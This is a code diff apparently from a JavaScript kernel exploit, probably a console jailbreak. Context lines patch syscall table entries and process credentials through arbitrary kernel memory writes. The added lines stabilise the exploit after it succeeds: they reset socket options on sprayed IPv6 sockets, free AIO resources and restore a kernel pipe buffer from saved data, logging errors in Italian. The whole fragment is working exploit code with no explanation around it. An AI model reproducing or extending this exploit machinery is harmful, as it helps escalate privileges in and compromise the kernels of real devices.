@@ -1605,6 +1605,41 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
     sessionStorage.setItem('jbsuccess', 1);
    // alert("kernel exploit succeeded!");
+
+    try {
+    const zeroBuf = new Buffer(0x100);
+    for (const sd of sds) {
+        try {
+            ssockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+            ssockopt(sd, IPPROTO_IPV6, IPV6_PKTINFO, zeroBuf, zeroBuf.size);
+            ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, zeroBuf, 0);
+        } catch (e) {
+            log(`Errore cleanup socket ${sd}: ${e}`);
+        }
+        try {
+            close(sd);
+        } catch (e) {}
+    }
+} catch (cleanupErr) {
+    log(`Errore durante il cleanup dei socket IPv6: ${cleanupErr}`);
+}
+
+try {
+    free_aios2(leak_ids.addr, leak_ids_len);
+} catch (e) {
+    log(`Errore durante il cleanup delle risorse AIO: ${e}`);
+}
+
+try {
+    const [kpipe, pipe_save] = restore_info;
+    for (let off = 0; off < pipe_save.size; off += 8) {
+        const old_val = pipe_save.read64(off);
+        kmem.write64(kpipe.add(off), old_val);
+    }
+} catch (e) {
+    log(`Errore durante il ripristino della pipebuf: ${e}`);
+}
+
 }
 
 
